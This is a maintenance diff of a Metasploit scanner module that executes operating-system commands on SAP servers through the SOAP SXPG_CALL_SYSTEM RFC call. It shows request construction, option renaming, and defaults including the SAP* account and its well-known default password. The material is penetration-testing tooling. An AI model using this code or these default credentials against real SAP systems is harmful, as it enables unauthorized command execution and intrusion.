@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -14,10 +14,7 @@
 # provided excellent feedback. Some people just seem to enjoy hacking SAP :)
 ##
 
-require 'msf/core'
-
-class Metasploit4 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -43,11 +40,11 @@ class Metasploit4 < Msf::Auxiliary
     register_options(
       [
         OptString.new('CLIENT', [true, 'SAP Client', '001']),
-        OptString.new('USERNAME', [true, 'Username', 'SAP*']),
-        OptString.new('PASSWORD', [true, 'Password', '06071992']),
+        OptString.new('HttpUsername', [true, 'Username', 'SAP*']),
+        OptString.new('HttpPassword', [true, 'Password', '06071992']),
         OptEnum.new('OS', [true, 'Target OS', "linux", ['linux','windows']]),
         OptString.new('CMD', [true, 'Command to run', "id"])
-      ], self.class)
+      ])
   end
 
   def run_host(ip)
@@ -93,14 +90,19 @@ class Metasploit4 < Msf::Auxiliary
     print_status("[SAP] #{ip}:#{rport} - sending SOAP SXPG_CALL_SYSTEM request")
     begin
       res = send_request_cgi({
-        'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
+        'uri' => '/sap/bc/soap/rfc',
         'method' => 'POST',
         'data' => data,
-        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
+        'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}",
         'ctype' => 'text/xml; charset=UTF-8',
-        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
-        'headers' =>{
+        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
+        'headers' => {
           'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
+        },
+        'encode_params' => false,
+        'vars_get' => {
+          'sap-client'    => datastore['CLIENT'],
+          'sap-language'  => 'EN'
         }
       })
       if res and res.code != 500 and res.code != 200
